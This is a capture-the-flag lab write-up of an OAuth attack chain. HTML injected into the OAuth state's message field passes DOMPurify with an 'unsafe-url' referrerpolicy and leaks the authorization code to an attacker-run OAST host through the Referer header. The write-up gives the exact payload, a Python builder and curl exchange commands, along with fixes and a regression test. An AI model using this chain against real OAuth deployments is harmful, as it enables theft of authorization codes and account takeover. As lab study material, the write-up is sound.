# Solo Leveling: HTMLi Gate — OAuth State HTMLi + Referer Leak

## What Is Happening

The [HTMLi Gate lab](https://solo-leveling-1-c043e8e00372.pwnbox-lab.com/) embeds OAuth `state` as base64 JSON on the homepage login link. The `message` field is rendered through DOMPurify on the OAuth error page. A reviewer bot with an active Google IdP session accepts URLs via `POST /report`.

The flag is on `/profile` for **Statue of God**, not default user `pwnu`.

## Why It Happens

1. **Controllable HTML in OAuth `state.message`**
   - Decoded state: `{"timestamp":...,"status":"ok","token":"...","message":""}`
   - Attacker reads `token` from their session's homepage link and rebuilds `state` with HTML in `message`.

2. **DOMPurify allows dangerous Referer behavior**
   - Error page script: `innerHTML = DOMPurify.sanitize(rawMessage)`
   - Custom hook keeps `referrerpolicy` on `A`, `IMG`, `IFRAME`.
   - Payload: `<img referrerpolicy="unsafe-url" src="https://[oast]/x">`

3. **OAuth code stays in error URL**
   - Non-empty `message` forces `/error?code=...&state=...` instead of `/profile`.
   - Subresource request sends full URL (including `code=`) in `Referer`.

4. **Two-state exchange trick**
   - Exfil state (with HTML `message`) steals the code.
   - Clean state (empty `message`, same `token`) exchanges stolen code to profile.

## Exploit Chain

1. Attacker `GET /` → decode `token` from embedded OAuth `state`.
2. Build **exfil state** (base64 JSON):

```json
{"timestamp":<unix>,"status":"ok","token":"<attacker_token>","message":"<img referrerpolicy=\"unsafe-url\" src=\"https://[oast]/x\">"}
```

3. Report Google OAuth URL:

```text
https://google-[instance].pwnbox-lab.com/o/oauth2/v2/auth
  ?client_id=solo-leveling-1-client
  &redirect_uri=https://solo-leveling-1-[instance].pwnbox-lab.com/callback
  &response_type=code
  &scope=openid email profile
  &prompt=none
  &state=<exfil_state_b64>
```

4. OAST receives `Referer` containing `code=...`.
5. Build **clean state** (same `token`, `"message":""`).
6. Attacker `GET /callback?code=STOLEN&state=<clean_state_b64>` → `/profile`.

## Exact Test

```bash
SL='https://solo-leveling-1-[instance].pwnbox-lab.com'
G='https://google-[instance].pwnbox-lab.com'

# Decode token from homepage OAuth link state field, then:
python3 -c "
import base64, json, time
print(base64.b64encode(json.dumps({
  'timestamp': int(time.time()),
  'status': 'ok',
  'token': '[TOKEN]',
  'message': '<img referrerpolicy=\"unsafe-url\" src=\"https://[oast]/x\">'
}, separators=(',', ':')).encode()).decode())
"

# POST /report with OAuth URL containing exfil state
# Poll OAST for Referer with code=
# Exchange with clean state (message empty)
curl -sS -b cookies.txt "$SL/callback?code=[STOLEN]&state=[CLEAN_STATE]" -L
curl -sS -b cookies.txt "$SL/profile"
```

## Expected Signal

- OAST hit: `Referer: https://.../error?code=...&state=...`
- Exchange with clean state → profile heading **Statue of God**
- Exchange with exfil state → stays on error page (by design)

## Root Cause

OAuth error page treats attacker-controlled `state.message` as HTML after incomplete sanitization. Allowing `referrerpolicy="unsafe-url"` on `<img>` leaks query-string secrets via Referer.

## Impact

- Theft of OAuth authorization codes → account takeover of reviewer/privileged users
- Lab: Statue of God profile + flag

## Fix

- Never render `state.message` as HTML; use text encoding
- Remove `referrerpolicy` from sanitizer allowlist
- `Referrer-Policy: no-referrer` on error pages carrying OAuth codes
- Single-use codes bound to initiating session

## Regression Test

1. Inject exfil payload into `state.message`.
2. Load error page with synthetic `code=` in URL.
3. Assert outbound subresource requests do **not** include `code` in Referer.

## Solo Leveling series

| Lab | Mechanism |
|-----|-----------|
| sl1 HTMLi Gate | DOMPurify `referrerpolicy` → Referer leak |
| sl2 State Gate | OAuth CSRF, server-staged code |
| sl3 Origin Gate | Hybrid fragment + `/logger` postMessage |
| sl4 Referer Gate | Referer trust on missing-code `/callback` + multi-account gate (see `writeups/solo-leveling-referer-gate-oauth-referer-leak.md`) |

## Report Summary

**Title:** OAuth authorization code leak via DOMPurify referrerpolicy in state.message HTML injection

**Severity:** High — attacker crafts OAuth link; victim click + error-page render exfiltrates code; attacker completes takeover
